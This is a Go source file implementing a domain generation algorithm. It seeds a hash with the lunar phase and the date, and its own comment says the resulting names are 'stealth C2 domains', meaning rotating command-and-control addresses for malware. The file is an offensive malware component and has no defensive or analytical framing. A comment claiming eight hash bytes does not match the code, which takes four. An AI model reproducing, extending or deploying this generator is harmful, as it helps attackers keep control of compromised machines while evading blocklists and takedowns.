package dga

import (
	"crypto/sha256"
	"fmt"
	"math"
	"time"
)

// LunaPhase represents the state of the moon.
type LunaPhase int

const (
	NewMoon LunaPhase = iota
	WaxingCrescent
	FirstQuarter
	WaxingGibbous
	FullMoon
	WaningGibbous
	LastQuarter
	WaningCrescent
)

func (p LunaPhase) String() string {
	return []string{
		"luna-nueva",
		"luna-creciente",
		"cuarto-creciente",
		"luna-gibosa-creciente",
		"luna-llena",
		"luna-gibosa-menguante",
		"cuarto-menguante",
		"luna-menguante",
	}[p]
}

// GetLunaPhase calculates the moon phase for a given time.
// This is a simplified astronomical calculation.
func GetLunaPhase(t time.Time) LunaPhase {
	// Reference: New Moon on 2024-01-11 11:57 UTC
	refDate := time.Date(2024, 1, 11, 11, 57, 0, 0, time.UTC)
	lunarCycle := 29.530588853 // Average synodic month

	secondsSinceRef := t.Sub(refDate).Seconds()
	phaseDays := math.Mod(secondsSinceRef/(24*3600), lunarCycle)
	if phaseDays < 0 {
		phaseDays += lunarCycle
	}

	normalized := phaseDays / lunarCycle

	switch {
	case normalized < 0.0625 || normalized > 0.9375:
		return NewMoon
	case normalized < 0.1875:
		return WaxingCrescent
	case normalized < 0.3125:
		return FirstQuarter
	case normalized < 0.4375:
		return WaxingGibbous
	case normalized < 0.5625:
		return FullMoon
	case normalized < 0.6875:
		return WaningGibbous
	case normalized < 0.8125:
		return LastQuarter
	default:
		return WaningCrescent
	}
}

// GenerateDomain generates a stealth C2 domain based on a seed, date, and moon phase.
func GenerateDomain(baseSeed string, t time.Time, tld string) string {
	phase := GetLunaPhase(t)
	dateStr := t.Format("20060102")
	
	// Complex seed combining lunar metadata
	input := fmt.Sprintf("%s-%s-%s", baseSeed, phase.String(), dateStr)
	hash := sha256.Sum256([]byte(input))
	
	// Take first 8 bytes of hash for domain uniqueness
	hexHash := fmt.Sprintf("%x", hash[:4])
	
	return fmt.Sprintf("%s-%s-%s.%s", phase.String(), dateStr, hexHash, tld)
}
